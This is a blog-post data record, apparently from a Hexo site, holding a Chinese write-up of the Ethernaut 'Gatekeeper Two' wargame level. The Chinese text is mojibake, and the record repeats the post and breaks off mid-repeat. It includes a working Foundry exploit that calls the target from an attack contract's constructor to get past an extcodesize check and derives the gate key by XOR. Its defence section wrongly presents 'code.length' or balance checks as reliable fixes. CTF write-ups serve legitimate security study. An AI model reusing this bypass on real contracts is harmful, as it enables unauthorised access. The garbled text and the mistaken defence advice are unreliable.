å¤æ‚çš„å¯†é’¥æ´¾ç”Ÿé€»è¾‘ï¼ˆå¦‚æœ¬ä¾‹ä¸­çš„XORï¼‰å¯èƒ½çœ‹èµ·æ¥å®‰å…¨ï¼Œä½†å¦‚æœæ‰€æœ‰è¾“å…¥éƒ½æ¥è‡ªé“¾ä¸Šï¼Œæ”»å‡»è€…é€šå¸¸å¯ä»¥é€†å‘å·¥ç¨‹å‡ºæ­£ç¡®çš„å¯†é’¥ã€‚åº”ä½¿ç”¨é“¾ä¸‹ç­¾åç­‰æ›´å®‰å…¨çš„æœºåˆ¶ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **`constructor`**: åˆçº¦çš„æ„é€ å‡½æ•°ï¼Œä»…åœ¨åˆçº¦éƒ¨ç½²æ—¶æ‰§è¡Œä¸€æ¬¡ã€‚ç†è§£å…¶åœ¨ç”Ÿå‘½å‘¨æœŸä¸­çš„ç‰¹æ®Šæ€§ï¼ˆå¦‚ `extcodesize` ä¸º0ï¼‰æ˜¯è§£å†³æ­¤ç±»æŒ‘æˆ˜çš„å…³é”®ã€‚\n-   **`extcodesize`**: ä¸€ä¸ªEVMæ“ä½œç ï¼Œç”¨äºè·å–åœ°å€çš„ä»£ç å¤§å°ã€‚æ˜¯åŒºåˆ†EOAå’Œåˆçº¦çš„å¸¸ç”¨æ–¹æ³•ï¼Œä½†æœ‰å…¶å±€é™æ€§ã€‚\n-   **å¼‚æˆ–è¿ç®— (`^`)**: ä¸€ç§ä½è¿ç®—ç¬¦ï¼Œåœ¨å¯†ç å­¦å’Œå“ˆå¸Œæ“ä½œä¸­å¾ˆå¸¸è§ã€‚ç†è§£å…¶ `A ^ B = C` <=> `A ^ C = B` çš„æ€§è´¨å¯¹äºè§£å†³ `gateThree` è‡³å…³é‡è¦ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   åˆçº¦åœ¨ `constructor` æ‰§è¡ŒæœŸé—´çš„ä»£ç å¤§å°ï¼ˆ`extcodesize`ï¼‰ä¸º0ã€‚\n-   `caller()` å’Œ `address(this)` åœ¨ç‰¹å®šä¸Šä¸‹æ–‡ä¸­çš„åŒºåˆ«å’Œè”ç³»ã€‚\n-   å¼‚æˆ–ï¼ˆXORï¼‰è¿ç®—çš„å¯é€†æ€§æ˜¯è§£å†³å¯†ç å­¦ç›¸å…³è°œé¢˜çš„å¸¸ç”¨å·¥å…·ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   åˆ©ç”¨ `constructor` çš„ç‰¹æ€§ç»•è¿‡ `extcodesize` æ£€æŸ¥ã€‚\n-   åœ¨ `constructor` ä¸­å®Œæˆæ‰€æœ‰æ”»å‡»æ­¥éª¤ï¼Œå®ç°â€œéƒ¨ç½²å³æ”»å‡»â€ã€‚\n-   é€†å‘å·¥ç¨‹XORé€»è¾‘ä»¥è®¡ç®—å‡ºæ‰€éœ€çš„å¯†é’¥ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   ä¸è¦ä¾èµ– `extcodesize` æ¥åˆ¤æ–­ä¸€ä¸ªåœ°å€æ˜¯å¦ä¸ºåˆçº¦ã€‚\n-   è®¾è®¡æ›´ç®€å•ã€æ›´ç›´æ¥çš„éªŒè¯æœºåˆ¶ï¼Œé¿å…æ¨¡ç³Šçš„é“¾ä¸Šå¯†é’¥æ´¾ç”Ÿã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [Solidity Docs: `extcodesize` Caveats](https://docs.soliditylang.org/en/latest/security-considerations.html#extcodesize-and-contracts-in-construction)\n-   [Understanding the EVM: Opcodes](https://www.evm.codes/)","slug":"ethernaut-level-14-gatekeeper-two","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpd0013bf5q6ik6gca5","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-14-Gatekeeper-Two-åˆçº¦åˆ›å»ºæ—¶çš„-extcodesize\"><a href=\"#ğŸ¯-Ethernaut-Level-14-Gatekeeper-Two-åˆçº¦åˆ›å»ºæ—¶çš„-extcodesize\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 14: Gatekeeper Two - åˆçº¦åˆ›å»ºæ—¶çš„ extcodesize\"></a>ğŸ¯ Ethernaut Level 14: Gatekeeper Two - åˆçº¦åˆ›å»ºæ—¶çš„ extcodesize</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/14\">Ethernaut Level 14 - Gatekeeper Two</a><br><strong>æ”»å‡»ç±»å‹</strong>: <code>extcodesize</code> &#x2F; <code>constructor</code> äº¤äº’<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>ä¸ä¸Šä¸€å…³ç±»ä¼¼ï¼Œæˆ‘ä»¬éœ€è¦å†æ¬¡é€šè¿‡ä¸‰ä¸ª <code>modifier</code> çš„æ£€æŸ¥ï¼Œæˆä¸º <code>entrant</code>ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel14.svg\" alt=\"Gatekeeper Two Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è¦é€šè¿‡æ­¤å…³å¡ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨ <code>enter(bytes8 _gateKey)</code> å‡½æ•°ï¼Œå¹¶ç»•è¿‡å®ƒçš„ä¸‰ä¸ª <code>modifier</code>ã€‚</p>\n<h3 id=\"Modifier-1-gateOne\"><a href=\"#Modifier-1-gateOne\" class=\"headerlink\" title=\"Modifier 1: gateOne\"></a>Modifier 1: <code>gateOne</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateOne() &#123;</span><br><span class=\"line\">  require(msg.sender != tx.origin);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ä¸ç¬¬13å…³å®Œå…¨ç›¸åŒã€‚æˆ‘ä»¬éœ€è¦é€šè¿‡ä¸€ä¸ªä¸­é—´åˆçº¦æ¥è°ƒç”¨ <code>enter</code> å‡½æ•°ï¼Œä»¥ç¡®ä¿ <code>msg.sender</code> æ˜¯åˆçº¦åœ°å€ï¼Œè€Œ <code>tx.origin</code> æ˜¯æˆ‘ä»¬çš„EOAåœ°å€ã€‚</p>\n<h3 id=\"Modifier-2-gateTwo\"><a href=\"#Modifier-2-gateTwo\" class=\"headerlink\" title=\"Modifier 2: gateTwo\"></a>Modifier 2: <code>gateTwo</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateTwo() &#123;</span><br><span class=\"line\">  uint x;</span><br><span class=\"line\">  assembly &#123;</span><br><span class=\"line\">    x := extcodesize(caller())</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  require(x == 0);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>è¿™ä¸ª <code>modifier</code> ä½¿ç”¨å†…è”æ±‡ç¼–æ£€æŸ¥ <code>caller()</code> çš„ <code>extcodesize</code> æ˜¯å¦ä¸º0ã€‚<code>caller()</code> è¿”å›çš„æ˜¯ç›´æ¥è°ƒç”¨è€…çš„åœ°å€ï¼ˆåœ¨æˆ‘ä»¬çš„åœºæ™¯ä¸­ï¼Œå°±æ˜¯æ”»å‡»åˆçº¦çš„åœ°å€ï¼‰ï¼Œè€Œ <code>extcodesize</code> è¿”å›è¯¥åœ°å€å…³è”çš„ä»£ç å¤§å°ã€‚</p>\n<ul>\n<li>å¦‚æœè°ƒç”¨è€…æ˜¯ä¸€ä¸ªå·²ç»éƒ¨ç½²çš„åˆçº¦ï¼Œ<code>extcodesize</code> ä¼šè¿”å›ä¸€ä¸ªå¤§äº0çš„å€¼ã€‚</li>\n<li>å¦‚æœè°ƒç”¨è€…æ˜¯ä¸€ä¸ªå¤–éƒ¨è´¦æˆ·ï¼ˆEOAï¼‰ï¼Œ<code>extcodesize</code> è¿”å›0ã€‚</li>\n</ul>\n<p>è¿™ä¸ <code>gateOne</code> çš„è¦æ±‚ï¼ˆ<code>msg.sender</code> å¿…é¡»æ˜¯åˆçº¦ï¼‰äº§ç”Ÿäº†çŸ›ç›¾ã€‚æˆ‘ä»¬å¦‚ä½•æ‰èƒ½è®©ä¸€ä¸ªåˆçº¦åœ°å€çš„ <code>extcodesize</code> ä¸º0å‘¢ï¼Ÿ</p>\n<p>ç­”æ¡ˆåœ¨äºåˆçº¦çš„åˆ›å»ºè¿‡ç¨‹ï¼š<strong>å½“ä¸€ä¸ªåˆçº¦çš„ <code>constructor</code> æ­£åœ¨æ‰§è¡Œæ—¶ï¼Œè¯¥åˆçº¦çš„ä»£ç å°šæœªå®Œå…¨éƒ¨ç½²åˆ°é“¾ä¸Šï¼Œå› æ­¤æ­¤æ—¶å¯¹è¯¥åˆçº¦åœ°å€è°ƒç”¨ <code>extcodesize</code> ä¼šè¿”å›0ã€‚</strong></p>\n<p>å› æ­¤ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨æ”»å‡»åˆçº¦çš„ <code>constructor</code> å†…éƒ¨è°ƒç”¨ç›®æ ‡åˆçº¦çš„ <code>enter</code> å‡½æ•°ã€‚</p>\n<h3 id=\"Modifier-3-gateThree\"><a href=\"#Modifier-3-gateThree\" class=\"headerlink\" title=\"Modifier 3: gateThree\"></a>Modifier 3: <code>gateThree</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class=\"line\">  require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>è¿™ä¸ª <code>modifier</code> åŒ…å«ä¸€ä¸ªæœ‰è¶£çš„å¼‚æˆ–ï¼ˆXORï¼‰é€»è¾‘ã€‚è®©æˆ‘ä»¬ç®€åŒ–ä¸€ä¸‹ï¼š</p>\n<p><code>A ^ B = C</code></p>\n<p>å…¶ä¸­ï¼š</p>\n<ul>\n<li><code>A</code> æ˜¯ <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code></li>\n<li><code>B</code> æ˜¯ <code>uint64(_gateKey)</code></li>\n<li><code>C</code> æ˜¯ <code>type(uint64).max</code> (å³ <code>0xFFFFFFFFFFFFFFFF</code>)</li>\n</ul>\n<p>æ ¹æ®å¼‚æˆ–è¿ç®—çš„æ€§è´¨ï¼Œå¦‚æœ <code>A ^ B = C</code>ï¼Œé‚£ä¹ˆ <code>A ^ C = B</code>ã€‚</p>\n<p>å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¡ç®— <code>A ^ C</code> æ¥å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„ <code>_gateKey</code>ã€‚</p>\n<p><code>_gateKey = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max</code></p>\n<p>ç”±äº <code>msg.sender</code> æ˜¯æˆ‘ä»¬çš„æ”»å‡»åˆçº¦åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ”»å‡»åˆçº¦çš„ <code>constructor</code> ä¸­è®¡ç®—å‡ºè¿™ä¸ªå€¼ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><p>æˆ‘ä»¬çš„æ”»å‡»åˆçº¦éå¸¸ç®€æ´ã€‚å®ƒåœ¨ <code>constructor</code> ä¸­å®Œæˆæ‰€æœ‰çš„å·¥ä½œï¼šè®¡ç®— <code>gateKey</code> å¹¶ç«‹å³è°ƒç”¨ç›®æ ‡å®ä¾‹çš„ <code>enter</code> å‡½æ•°ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/14_GatekeeperTwo.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// Foundry æµ‹è¯•åˆçº¦</span><br><span class=\"line\">contract GatekeeperTwoTest is Test &#123;</span><br><span class=\"line\">    GatekeeperTwo instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player1;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player1 = vm.addr(1);</span><br><span class=\"line\">        instance = new GatekeeperTwo();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player1, player1);</span><br><span class=\"line\">        // éƒ¨ç½²æ”»å‡»åˆçº¦æ—¶ï¼Œå…¶æ„é€ å‡½æ•°ä¼šè‡ªåŠ¨æ‰§è¡Œæ”»å‡»</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æ˜¯å¦æˆåŠŸ</span><br><span class=\"line\">        assertEq(instance.entrant(), player1);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ”»å‡»åˆçº¦</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    constructor(address _instanceAddress) &#123;</span><br><span class=\"line\">        GatekeeperTwo instance = GatekeeperTwo(_instanceAddress);</span><br><span class=\"line\"></span><br><span class=\"line\">        // è®¡ç®— gateKey</span><br><span class=\"line\">        // A ^ C = B</span><br><span class=\"line\">        uint64 keyPart = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));</span><br><span class=\"line\">        uint64 max_uint = type(uint64).max; // 0xFFFFFFFFFFFFFFFF</span><br><span class=\"line\">        bytes8 gateKey = bytes8(keyPart ^ max_uint);</span><br><span class=\"line\"></span><br><span class=\"line\">        // åœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨ enter å‡½æ•°</span><br><span class=\"line\">        instance.enter(gateKey);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>åˆ›å»ºæ”»å‡»åˆçº¦</strong>: æ”»å‡»é€»è¾‘å®Œå…¨åŒ…å«åœ¨ <code>constructor</code> ä¸­ã€‚</li>\n<li><strong>åœ¨ <code>constructor</code> ä¸­è°ƒç”¨</strong>: è¿™æ˜¯å…³é”®ã€‚åœ¨ <code>constructor</code> ä¸­è°ƒç”¨ <code>enter</code> å‡½æ•°ï¼Œæ­¤æ—¶ <code>extcodesize(address(this))</code> ä¸º0ï¼Œç»•è¿‡äº† <code>gateTwo</code>ã€‚</li>\n<li><strong>è®¡ç®— <code>_gateKey</code></strong>: åœ¨ <code>constructor</code> ä¸­ï¼Œä½¿ç”¨ <code>address(this)</code> ä½œä¸º <code>msg.sender</code> æ¥è®¡ç®— <code>keccak256</code> å“ˆå¸Œï¼Œå¹¶é€šè¿‡XORè¿ç®—å¾—åˆ°æ­£ç¡®çš„ <code>_gateKey</code>ï¼Œä»è€Œç»•è¿‡ <code>gateThree</code>ã€‚</li>\n<li><strong>éƒ¨ç½²å³æ”»å‡»</strong>: éƒ¨ç½²æ”»å‡»åˆçº¦çš„äº¤æ˜“ä¸€æ—¦æˆåŠŸï¼Œæ”»å‡»å°±å®Œæˆäº†ï¼Œ<code>entrant</code> å°†è¢«è®¾ç½®ä¸ºæˆ‘ä»¬çš„EOAåœ°å€ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><strong>é¿å…ä½¿ç”¨ <code>extcodesize</code> è¿›è¡Œåˆçº¦æ£€æŸ¥</strong>: æ­£å¦‚æœ¬ä¾‹æ‰€ç¤ºï¼Œ<code>extcodesize</code> å¯ä»¥è¢« <code>constructor</code> è°ƒç”¨ç»•è¿‡ã€‚ä¸€ä¸ªæ›´å¯é çš„æ£€æŸ¥æ–¹æ³•æ˜¯åˆ¤æ–­ <code>address.balance &gt; 0</code> æˆ–è€… <code>address.code.length &gt; 0</code>ï¼ˆåœ¨Solidity 0.8.10åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼‰ã€‚</li>\n<li><strong>å¯¹ <code>caller</code> çš„é¢å¤–æ£€æŸ¥</strong>: å¦‚æœç¡®å®éœ€è¦é˜»æ­¢åˆçº¦è°ƒç”¨ï¼Œå¯ä»¥ç»“åˆ <code>tx.origin == msg.sender</code> çš„æ£€æŸ¥ï¼Œä½†è¿™ä¼šé™åˆ¶åˆçº¦çš„å¯ç»„åˆæ€§ã€‚</li>\n<li><strong>ç®€åŒ–å¯†é’¥éªŒè¯</strong>: å¤æ‚çš„å¯†é’¥æ´¾ç”Ÿé€»è¾‘ï¼ˆå¦‚æœ¬ä¾‹ä¸­çš„XORï¼‰å¯èƒ½çœ‹èµ·æ¥å®‰å…¨ï¼Œä½†å¦‚æœæ‰€æœ‰è¾“å…¥éƒ½æ¥è‡ªé“¾ä¸Šï¼Œæ”»å‡»è€…é€šå¸¸å¯ä»¥é€†å‘å·¥ç¨‹å‡ºæ­£ç¡®çš„å¯†é’¥ã€‚åº”ä½¿ç”¨é“¾ä¸‹ç­¾åç­‰æ›´å®‰å…¨çš„æœºåˆ¶ã€‚</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong><code>constructor</code></strong>: åˆçº¦çš„æ„é€ å‡½æ•°ï¼Œä»…åœ¨åˆçº¦éƒ¨ç½²æ—¶æ‰§è¡Œä¸€æ¬¡ã€‚ç†è§£å…¶åœ¨ç”Ÿå‘½å‘¨æœŸä¸­çš„ç‰¹æ®Šæ€§ï¼ˆå¦‚ <code>extcodesize</code> ä¸º0ï¼‰æ˜¯è§£å†³æ­¤ç±»æŒ‘æˆ˜çš„å…³é”®ã€‚</li>\n<li><strong><code>extcodesize</code></strong>: ä¸€ä¸ªEVMæ“ä½œç ï¼Œç”¨äºè·å–åœ°å€çš„ä»£ç å¤§å°ã€‚æ˜¯åŒºåˆ†EOAå’Œåˆçº¦çš„å¸¸ç”¨æ–¹æ³•ï¼Œä½†æœ‰å…¶å±€é™æ€§ã€‚</li>\n<li><strong>å¼‚æˆ–è¿ç®— (<code>^</code>)</strong>: ä¸€ç§ä½è¿ç®—ç¬¦ï¼Œåœ¨å¯†ç å­¦å’Œå“ˆå¸Œæ“ä½œä¸­å¾ˆå¸¸è§ã€‚ç†è§£å…¶ <code>A ^ B = C</code> &lt;&#x3D;&gt; <code>A ^ C = B</code> çš„æ€§è´¨å¯¹äºè§£å†³ <code>gateThree</code> è‡³å…³é‡è¦ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>åˆçº¦åœ¨ <code>constructor</code> æ‰§è¡ŒæœŸé—´çš„ä»£ç å¤§å°ï¼ˆ<code>extcodesize</code>ï¼‰ä¸º0ã€‚</li>\n<li><code>caller()</code> å’Œ <code>address(this)</code> åœ¨ç‰¹å®šä¸Šä¸‹æ–‡ä¸­çš„åŒºåˆ«å’Œè”ç³»ã€‚</li>\n<li>å¼‚æˆ–ï¼ˆXORï¼‰è¿ç®—çš„å¯é€†æ€§æ˜¯è§£å†³å¯†ç å­¦ç›¸å…³è°œé¢˜çš„å¸¸ç”¨å·¥å…·ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>åˆ©ç”¨ <code>constructor</code> çš„ç‰¹æ€§ç»•è¿‡ <code>extcodesize</code> æ£€æŸ¥ã€‚</li>\n<li>åœ¨ <code>constructor</code> ä¸­å®Œæˆæ‰€æœ‰æ”»å‡»æ­¥éª¤ï¼Œå®ç°â€œéƒ¨ç½²å³æ”»å‡»â€ã€‚</li>\n<li>é€†å‘å·¥ç¨‹XORé€»è¾‘ä»¥è®¡ç®—å‡ºæ‰€éœ€çš„å¯†é’¥ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>ä¸è¦ä¾èµ– <code>extcodesize</code> æ¥åˆ¤æ–­ä¸€ä¸ªåœ°å€æ˜¯å¦ä¸ºåˆçº¦ã€‚</li>\n<li>è®¾è®¡æ›´ç®€å•ã€æ›´ç›´æ¥çš„éªŒè¯æœºåˆ¶ï¼Œé¿å…æ¨¡ç³Šçš„é“¾ä¸Šå¯†é’¥æ´¾ç”Ÿã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/security-considerations.html#extcodesize-and-contracts-in-construction\">Solidity Docs: <code>extcodesize</code> Caveats</a></li>\n<li><a href=\"https://www.evm.codes/\">Understanding the EVM: Opcodes</a></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-14-Gatekeeper-Two-åˆçº¦åˆ›å»ºæ—¶çš„-extcodesize\"><a href=\"#ğŸ¯-Ethernaut-Level-14-Gatekeeper-Two-åˆçº¦åˆ›å»ºæ—¶çš„-extcodesize\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 14: Gatekeeper Two - åˆçº¦åˆ›å»ºæ—¶çš„ extcodesize\"></a>ğŸ¯ Ethernaut Level 14: Gatekeeper Two - åˆçº¦åˆ›å»ºæ—¶çš„ extcodesize</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/14\">Ethernaut Level 14 - Gatekeeper Two</a><br><strong>æ”»å‡»ç±»å‹</strong>: <code>extcodesize</code> &#x2F; <code>constructor</code> äº¤äº’<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>ä¸ä¸Šä¸€å…³ç±»ä¼¼ï¼Œæˆ‘ä»¬éœ€è¦å†æ¬¡é€šè¿‡ä¸‰ä¸ª <code>modifier</code> çš„æ£€æŸ¥ï¼Œæˆä¸º <code>entrant</code>ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel14.svg\" alt=\"Gatekeeper Two Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è¦é€šè¿‡æ­¤å…³å¡ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨ <code>enter(bytes8 _gateKey)</code> å‡½æ•°ï¼Œå¹¶ç»•è¿‡å®ƒçš„ä¸‰ä¸ª <code>modifier</code>ã€‚</p>\n<h3 id=\"Modifier-1-gateOne\"><a href=\"#Modifier-1-gateOne\" class=\"headerlink\" title=\"Modifier 1: gateOne\"></a>Modifier 1: <code>gateOne</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateOne() &#123;</span><br><span class=\"line\">  require(msg.sender != tx.origin);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ä¸ç¬¬13å…³å®Œå…¨ç›¸åŒã€‚æˆ‘ä»¬éœ€è¦é€šè¿‡ä¸€ä¸ªä¸­é—´åˆçº¦æ¥è°ƒç”¨ <code>enter</code> å‡½æ•°ï¼Œä»¥ç¡®ä¿ <code>msg.sender</code> æ˜¯åˆçº¦åœ°å€ï¼Œè€Œ <code>tx.origin</code> æ˜¯æˆ‘ä»¬çš„EOAåœ°å€ã€‚</p>\n<h3 id=\"Modifier-2-gateTwo\"><a href=\"#Modifier-2-gateTwo\" class=\"headerlink\" title=\"Modifier 2: gateTwo\"></a>Modifier 2: <code>gateTwo</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateTwo() &#123;</span><br><span class=\"line\">  uint x;</span><br><span class=\"line\">  assembly &#123;</span><br><span class=\"line\">    x := extcodesize(caller())</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  require(x == 0);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>è¿™ä¸ª <code>modifier</code> ä½¿ç”¨å†…è”æ±‡ç¼–æ£€æŸ¥ <code>caller()</code> çš„ <code>extcodesize</code> æ˜¯å¦ä¸º0ã€‚<code>caller()</code> è¿”å›çš„æ˜¯ç›´æ¥è°ƒç”¨è€…çš„åœ°å€ï¼ˆåœ¨æˆ‘ä»¬çš„åœºæ™¯ä¸­ï¼Œå°±æ˜¯æ”»å‡»åˆçº¦çš„åœ°å€ï¼‰ï¼Œè€Œ <code>extcodesize</code> è¿”å›è¯¥åœ°å€å…³è”çš„ä»£ç 